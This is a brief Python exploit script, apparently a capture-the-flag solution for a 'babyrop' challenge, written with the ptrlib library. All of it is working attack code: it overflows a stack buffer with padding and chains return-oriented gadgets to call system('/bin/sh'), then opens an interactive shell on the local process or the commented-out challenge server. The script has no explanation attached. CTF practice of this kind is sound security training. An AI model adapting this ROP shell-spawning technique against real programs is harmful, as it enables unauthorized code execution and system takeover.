from ptrlib import *

sock = Process("./babyrop")
elf = ELF("./babyrop")
#sock = Socket("problem.harekaze.com", 20001)

rop_pop_rdi = 0x00400683
rop_ret = 0x00400479

payload = b'A' * 0x18
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(elf.base() + 0x200000 + next(elf.find("/bin/sh\x00")))
payload += p64(elf.plt("system"))
payload += p64(0xffffffffffffffff)
sock.sendline(payload)

sock.interactive()
